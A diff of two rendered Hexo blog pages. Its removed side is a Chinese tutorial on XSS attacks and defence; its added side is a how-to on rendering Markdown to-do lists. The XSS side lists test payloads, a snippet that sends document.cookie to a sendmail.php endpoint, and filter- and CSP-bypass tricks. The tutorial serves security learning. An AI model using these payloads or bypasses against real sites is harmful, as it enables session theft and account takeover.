@@ -21,33 +21,28 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"tianlipa.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.24.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":16,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeIn","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="客户端的Cookie: 记录登录状态，跟踪用户行为 服务端的Session JavaScript操作Cookie 获取和设置： document.cookie;document.cookie&#x3D;‘name&#x3D;abc’; 无法删除，只能通过更改过期时间删除。 脚本注入网页：XSS(Cross Site Script) &lt;script&gt;alert(1)&lt;&#x2F;script&gt;">
+    <meta name="description" content="起因是想把自己的待看清单传上来, 然后发现hexo默认不支持渲染这样的待办清单.   和人类社交  学习  吃饭  打游戏  必应搜了一下没搜到, 遂去翻了一下github issues, 找到了解决方法. 使用渲染器为hexo-renderer-markdown-it, 安装方法如下. npm install hexo-renderer-markdown-it --save 在_config.y">
 <meta property="og:type" content="article">
-<meta property="og:title" content="3-XSS渗透与防御">
-<meta property="og:url" content="https://tianlipa.github.io/2025/08/msb-03-xss/index.html">
+<meta property="og:title" content="hexo博客如何渲染Markdown待办清单TO-DO List">
+<meta property="og:url" content="https://tianlipa.github.io/2025/08/hexo-todo-list/index.html">
 <meta property="og:site_name" content="tianlipa">
-<meta property="og:description" content="客户端的Cookie: 记录登录状态，跟踪用户行为 服务端的Session JavaScript操作Cookie 获取和设置： document.cookie;document.cookie&#x3D;‘name&#x3D;abc’; 无法删除，只能通过更改过期时间删除。 脚本注入网页：XSS(Cross Site Script) &lt;script&gt;alert(1)&lt;&#x2F;script&gt;">
+<meta property="og:description" content="起因是想把自己的待看清单传上来, 然后发现hexo默认不支持渲染这样的待办清单.   和人类社交  学习  吃饭  打游戏  必应搜了一下没搜到, 遂去翻了一下github issues, 找到了解决方法. 使用渲染器为hexo-renderer-markdown-it, 安装方法如下. npm install hexo-renderer-markdown-it --save 在_config.y">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://tianlipa.github.io/img/msb/17376208071206.png">
-<meta property="og:image" content="https://tianlipa.github.io/img/msb/17376210736185.png">
-<meta property="og:image" content="https://tianlipa.github.io/img/msb/17376413018599.png">
-<meta property="article:published_time" content="2025-08-13T05:37:07.000Z">
-<meta property="article:modified_time" content="2025-08-13T06:11:42.570Z">
+<meta property="article:published_time" content="2025-08-19T02:19:29.000Z">
+<meta property="article:modified_time" content="2025-08-19T02:34:51.243Z">
 <meta property="article:author" content="tianlipa">
-<meta property="article:tag" content="CTF">
-<meta property="article:tag" content="web">
-<meta property="article:tag" content="马士兵">
+<meta property="article:tag" content="疑难解答">
+<meta property="article:tag" content="博客美化">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://tianlipa.github.io/img/msb/17376208071206.png">
 
 
-<link rel="canonical" href="https://tianlipa.github.io/2025/08/msb-03-xss/">
+<link rel="canonical" href="https://tianlipa.github.io/2025/08/hexo-todo-list/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://tianlipa.github.io/2025/08/msb-03-xss/","path":"2025/08/msb-03-xss/","title":"3-XSS渗透与防御"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://tianlipa.github.io/2025/08/hexo-todo-list/","path":"2025/08/hexo-todo-list/","title":"hexo博客如何渲染Markdown待办清单TO-DO List"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>3-XSS渗透与防御 | tianlipa</title>
+<title>hexo博客如何渲染Markdown待办清单TO-DO List | tianlipa</title>
   
 
 
@@ -308,7 +303,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://tianlipa.github.io/2025/08/msb-03-xss/">
+    <link itemprop="mainEntityOfPage" href="https://tianlipa.github.io/2025/08/hexo-todo-list/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -321,12 +316,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="3-XSS渗透与防御 | tianlipa">
+      <meta itemprop="name" content="hexo博客如何渲染Markdown待办清单TO-DO List | tianlipa">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          3-XSS渗透与防御
+          hexo博客如何渲染Markdown待办清单TO-DO List
         </h1>
 
         <div class="post-meta-container">
@@ -338,7 +333,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2025-08-13 13:37:07 / 修改时间：14:11:42" itemprop="dateCreated datePublished" datetime="2025-08-13T13:37:07+08:00">2025-08-13</time>
+      <time title="创建时间：2025-08-19 10:19:29 / 修改时间：10:34:51" itemprop="dateCreated datePublished" datetime="2025-08-19T10:19:29+08:00">2025-08-19</time>
     </span>
 
   
@@ -350,101 +345,39 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><p>客户端的Cookie: 记录登录状态，跟踪用户行为</p>
-<p>服务端的Session</p>
-<h2 id="JavaScript操作Cookie">JavaScript操作Cookie</h2>
-<p>获取和设置：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span>=‘name=abc’;</span><br></pre></td></tr></table></figure>
-<p>无法删除，只能通过更改过期时间删除。</p>
-<h2 id="脚本注入网页：XSS-Cross-Site-Script">脚本注入网页：XSS(Cross Site Script)</h2>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+    <div class="post-body" itemprop="articleBody"><p>起因是想把自己的待看清单传上来, 然后发现hexo默认不支持渲染这样的待办清单.</p>
+<ul class="contains-task-list">
+<li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox"> 和人类社交</li>
+<li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox"> 学习</li>
+<li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 吃饭</li>
+<li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 打游戏</li>
+</ul>
+<p>必应搜了一下没搜到, 遂去翻了一下github issues, 找到了解决方法.</p>
+<p>使用渲染器为<a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo-renderer-markdown-it">hexo-renderer-markdown-it</a>, 安装方法如下.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-markdown-it --save</span><br></pre></td></tr></table></figure>
+<p>在<code>_config.yml</code>中添加如下内容:</p>
 <span id="more"></span>
-<h3 id="反射型XSS">反射型XSS</h3>
-<p><img src="/img/msb/17376208071206.png" alt=""></p>
-<h3 id="存储型（持久型）XSS">存储型（持久型）XSS</h3>
-<p><img src="/img/msb/17376210736185.png" alt=""></p>
-<h3 id="实例：获取Cookie发送邮件">实例：获取Cookie发送邮件</h3>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(‘img’);</span><br><span class="line">img.<span class="property">width</span> = <span class="number">0</span>;</span><br><span class="line">img.<span class="property">height</span> = <span class="number">0</span>;</span><br><span class="line">img.<span class="property">src</span> = ‘<span class="attr">http</span>:<span class="comment">//localhost/xss/sendmail.php?mycookie=‘+encodeURIComponent(document.cookie); </span></span><br></pre></td></tr></table></figure>
-<h2 id="XSS检测和利用">XSS检测和利用</h2>
-<h3 id="测试payload">测试payload</h3>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(‘<span class="variable constant_">XSS</span>’)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&gt;=‘&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">“&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">%3Cscript%3Ealert(<span class="variable language_">document</span>.<span class="property">cookie</span>)%3C/script%3E</span><br><span class="line">&lt;img src=“<span class="attr">javascript</span>:<span class="title function_">alert</span>(‘<span class="variable constant_">XSS</span>’)”&gt;</span><br><span class="line">onerror=“<span class="title function_">alert</span>(‘<span class="variable constant_">XSS</span>’)”&gt;</span><br></pre></td></tr></table></figure>
-<p>SVG标签会将XML实体解析后加入标签，eval函数能够接受十六进制的字符串，可用于绕过一些符号过滤。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;svg&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>prompt%#x28;1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>&lt;/svg&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>.<span class="property">call</span><span class="string">`<span class="subst">$&#123;‘prompt\x281)’&#125;</span>`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
-<h3 id="自动化检测工具">自动化检测工具</h3>
-<p>XSSER: <a target="_blank" rel="noopener" href="http://xsser.03c8.net">xsser.03c8.net</a></p>
-<p>XSSSTRIKE</p>
-<h2 id="XSS防御方法">XSS防御方法</h2>
-<hr>
-<h3 id="反射型XSS-2">反射型XSS</h3>
-<p>恶意代码未被服务器储存，每次触发漏洞时，都将恶意代码通过GET/POST方式提交，用户输入的内容被直接输出在HTML中，然后触发漏洞。</p>
-<p>若注入点在标签内部，则不需要插入标签。例如script标签内部，可以直接插入javascript语句，类似SQL注入，先闭合引号，再注释后面的引号。<br>
-其他标签内，可以先闭合引号，再插入可以执行javascript代码的属性进行XSS攻击。</p>
-<h3 id="存储型XSS">存储型XSS</h3>
-<p>与反射型基本思路相同，都是在后端未对用户输入进行过滤导致的漏洞，但存储型XSS将用户输入保存在数据库或其他的服务器存储中，只要服务保存了XSS代码，便可造成持续性的影响，相比之下更具威胁性。</p>
-<p>在实际环境中，常见于用户发的帖子或个人信息等页面，其他用户访问时便触发XSS。</p>
-<h3 id="DOM-Document-Obect-Model-文档对象模型-型XSS">DOM(Document Obect Model, 文档对象模型)型XSS</h3>
-<p>漏洞发生于前端而非后端，前端将用户输入直接写入到了HTML中。Javascript具有操作DOM的功能，可以提取用户的输入，直接插入到DOM中，造成XSS。</p>
-<p>payload与反射/存储型相同，如<code>name=&lt;script&gt;alert(‘aminos’)&lt;/script&gt;</code></p>
-<p>注意，只有document.write()函数才会执行script标签内的代码，而通过修改DOM属性innerHTML插入HTML内容不会执行其中script标签内代码，但可以通过插入<code>&lt;img scr=x onerror=alert(1)&gt;</code>的方法执行类似onerror属性中的javascript代码。</p>
-<h2 id="可以用于执行XSS的标签">可以用于执行XSS的标签</h2>
-<ol>
-<li>几乎所有的标签on事件，如<code>&lt;h1 onmousemove=“alert(1)”&gt;hello&lt;/h1&gt;</code><br>
-另一个常见的是img标签的onerror属性</li>
-</ol>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=“<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)”&gt;&lt;/frame&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">“alert(1)”</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
-<p><a target="_blank" rel="noopener" href="http://xn--portswigger-x12sn617b.net/web-security/cross-site-scripting/cheat-sheet">参考portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></p>
-<ol start="2">
-<li>HTML5特性的XSS，<a target="_blank" rel="noopener" href="http://xn--www-5u3e363r.html5sec.org">参考www.html5sec.org</a><br>
-很多标签的on属性需要用户交互才能完成触发，如<code>&lt;input onfocus=‘alert(1)&gt;</code>，输入框获得焦点后才能触发alert(1)<br>
-但HTML5的autofocus可以自动实现聚焦，让需要交互的XSS变成了无需交互的XSS，降低了成本。</li>
-</ol>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;input onfocus=‘<span class="title function_">alert</span>(<span class="number">1</span>)’ autofocus&gt;</span><br></pre></td></tr></table></figure>
-<ol start="3">
-<li>javascript伪协议<br>
-如<code>javascript:void(0)</code>中，”javascript:”表示javascript伪协议，它是由javascript引擎来执行的，如</li>
-</ol>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;a href=“<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)”&gt;click here&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-<p>iframe标签也可以使用javascript伪协议，实现自动触发，如</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=“<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)”&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="防御">防御</h2>
-<p>过滤主要有WAF层和代码层，WAF层通常在外部，在主机或网络硬件上对HTTP请求进行过滤拦截，而代码层是在编写web应用的过程中实现对用户输入进行过滤。<br>
-但javascript语法非常灵活，所以对于普通的正则匹配和字符串比较，很难拦截XSS。</p>
-<ol>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">markdown:</span></span><br><span class="line">  <span class="attr">preset:</span> <span class="string">&#x27;default&#x27;</span></span><br><span class="line">  <span class="attr">render:</span></span><br><span class="line">    <span class="attr">html:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">xhtmlOut:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">langPrefix:</span> <span class="string">&#x27;language-&#x27;</span></span><br><span class="line">    <span class="attr">breaks:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">linkify:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">typographer:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">quotes:</span> <span class="string">&#x27;“”‘’&#x27;</span></span><br><span class="line">  <span class="attr">enable_rules:</span></span><br><span class="line">  <span class="attr">disable_rules:</span></span><br><span class="line">  <span class="attr">plugins:</span></span><br><span class="line">  <span class="attr">anchors:</span></span><br><span class="line">    <span class="attr">level:</span> <span class="number">2</span></span><br><span class="line">    <span class="attr">collisionSuffix:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="attr">permalink:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">permalinkClass:</span> <span class="string">&#x27;header-anchor&#x27;</span></span><br><span class="line">    <span class="attr">permalinkSide:</span> <span class="string">&#x27;left&#x27;</span></span><br><span class="line">    <span class="attr">permalinkSymbol:</span> <span class="string">&#x27;¶&#x27;</span></span><br><span class="line">    <span class="attr">case:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">separator:</span> <span class="string">&#x27;-&#x27;</span></span><br><span class="line">  <span class="attr">images:</span></span><br><span class="line">    <span class="attr">lazyload:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">prepend_root:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">post_asset:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">inline:</span> <span class="literal">false</span>  <span class="comment"># https://markdown-it.github.io/markdown-it/#MarkdownIt.renderInline</span></span><br></pre></td></tr></table></figure>
+<p>hexo-renderer-markdown-it就安装好了, 接下来需要安装<a target="_blank" rel="noopener" href="https://github.com/revin/markdown-it-task-lists">markdown-it-task-lists</a>插件.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install markdown-it-task-lists</span><br></pre></td></tr></table></figure>
+<p>在<code>_config.yml</code>里找到你刚刚添加的内容, 把</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">markdown:</span></span><br><span class="line">  <span class="attr">plugins:</span></span><br></pre></td></tr></table></figure>
+<p>改成</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">markdown:</span></span><br><span class="line">  <span class="attr">plugins:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-task-lists</span></span><br></pre></td></tr></table></figure>
+<p>然后运行<code>hexo clean &amp;&amp; hexo g</code>即可.</p>
+<p>但是这样生成的待办清单行首会有一个markdown无序列表的黑点, 让我很不爽, 大概像这样:</p>
+<ul>
 <li>
-<p>富文本过滤<br>
-大多数富文本编辑器都允许用户直接编辑HTML，从而引入了XSS漏洞。常见过滤方式是对用户输入的标签进行限制，我们可以寻找黑名单中遗漏的标签。<br>
-<a target="_blank" rel="noopener" href="http://xn--portswigger-x12sn617b.net/web-security/cross-site-scripting/cheat-sheet">参考portswigger.net/web-security/cross-site-scripting/cheat-sheet</a><br>
-如果过滤器本身存在缺陷，如将黑名单替换为空，则可以采用双写绕过。</p>
+<ul class="contains-task-list">
+<li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox"> 像我这样</li>
+</ul>
 </li>
-<li>
-<p>注入点在标签属性中<br>
-如果没有过滤&lt;和&gt;，可以直接引入新的标签，如果尖括号被过滤，可以插入新的事件属性，如onload, onmousemove。<br>
-标签的字段支持HTML编码，可以借此绕过一些过滤。如：</p>
-</li>
-</ol>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img scr=x onerror=“&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x28;&amp;#x31;&amp;#x29;”&gt;</span><br></pre></td></tr></table></figure>
-<p>onerror内内容即alert(1)进行HTML编码后的结果。</p>
-<ol start="3">
-<li>注入点在script标签中<br>
-如果注入点被引号包裹，可以像SQL注入一样，先闭合引号，再用分号结束语句，然后插入代码。<br>
-如果引号被过滤，且一行存在两个注入点：<br>
-<code>var url=‘http://example.com/?name=&lt;?=$name?&gt;’+’&lt;?=$address?&gt;’</code><br>
-可以用反斜杠使第一个反引号被转义，从第二个引号开始插入代码：<br>
-<code>var url=‘http://example.com/?name=\‘+’;alert(1);\\</code><br>
-\是name的值，;alert(1);\是address的值。<br>
-如果存在单词黑名单，如不允许出现eval等字符，可以用unicode编码绕过。</li>
-</ol>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\u0065\u0076\u0061\<span class="title function_">u006c</span>(‘<span class="title function_">alert</span>(<span class="number">1</span>)’)</span><br></pre></td></tr></table></figure>
-<ol start="4">
-<li>CSP过滤及其绕过<br>
-CSP(Content Security Policy)是一个额外的安全层，用于检测并缓解某些特定类型的注入，包括XSS和数据注入等。<br>
-<img src="/img/msb/17376413018599.png" alt=""><br>
-绕过script-scr ‘self’, self意味着只允许加载同域名目录下的脚本，所以我们可以寻找文件上传或jsonp借口。<br>
-需要注意的是，如果是图片上传接口，即访问资源时的Content-Type为image/png, 浏览器会拒绝将其作为脚本执行。<br>
-jsonp接口一般采用?callback=xxx的方式传参，如<code>xxx(&#123;“result”:”success”&#125;)</code><br>
-此时若传<code>callback=alert(1);//</code>，就会产生这样的返回：<br>
-<code>alert(1);//(&#123;“result”:”success”&#125;)</code></li>
-</ol>
+</ul>
+<p>遂在<code>_config.next.yml</code>(根据主题不同操作方法可能不同, 我用的是NexT主题)找到如下内容:</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">custom_file_path:</span></span><br><span class="line">  <span class="comment">#head: source/_data/head.njk</span></span><br><span class="line">  <span class="comment">#header: source/_data/header.njk</span></span><br><span class="line">  <span class="comment">#sidebar: source/_data/sidebar.njk</span></span><br><span class="line">  <span class="comment">#postMeta: source/_data/post-meta.njk</span></span><br><span class="line">  <span class="comment">#postBodyStart: source/_data/post-body-start.njk</span></span><br><span class="line">  <span class="comment">#postBodyEnd: source/_data/post-body-end.njk</span></span><br><span class="line">  <span class="comment">#footer: source/_data/footer.njk</span></span><br><span class="line">  <span class="comment">#bodyEnd: source/_data/body-end.njk</span></span><br><span class="line">  <span class="comment">#variable: source/_data/variables.styl</span></span><br><span class="line">  <span class="comment">#mixin: source/_data/mixins.styl</span></span><br><span class="line">  <span class="comment">#style: source/_data/styles.styl</span></span><br></pre></td></tr></table></figure>
+<p>将<code>style: source/_data/styles.styl</code>这行取消注释, 然后在<code>/source</code>目录下新建<code>/_data/styles.styl</code>文件, 内容为:</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.task-list-item</span> &#123;</span><br><span class="line">  <span class="attribute">list-style-type</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.task-list-item</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;checkbox&quot;</span>]</span> &#123;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">1em</span>;</span><br><span class="line">  <span class="attribute">margin-right</span>: <span class="number">0.5em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第一段取消前面的黑点, 第二段用于调节位置, 可以根据自己的需要修改.</p>
 
     </div>
 
@@ -454,23 +387,19 @@ jsonp接口一般采用?callback=xxx的方式传参，如<code>xxx(&#123;“resu
 
     <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/CTF/" rel="tag"># CTF</a>
-              <a href="/tags/web/" rel="tag"># web</a>
-              <a href="/tags/%E9%A9%AC%E5%A3%AB%E5%85%B5/" rel="tag"># 马士兵</a>
+              <a href="/tags/%E7%96%91%E9%9A%BE%E8%A7%A3%E7%AD%94/" rel="tag"># 疑难解答</a>
+              <a href="/tags/%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96/" rel="tag"># 博客美化</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2025/08/msb-02-sql-injection/" rel="prev" title="2-SQL注入">
-                  <i class="fa fa-angle-left"></i> 2-SQL注入
+                <a href="/2025/08/2025-8-18/" rel="prev" title="2025-8-18">
+                  <i class="fa fa-angle-left"></i> 2025-8-18
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2025/08/msb-04-csrf/" rel="next" title="4-CSRF漏洞渗透与防御">
-                  4-CSRF漏洞渗透与防御 <i class="fa fa-angle-right"></i>
-                </a>
             </div>
           </div>
     </footer>
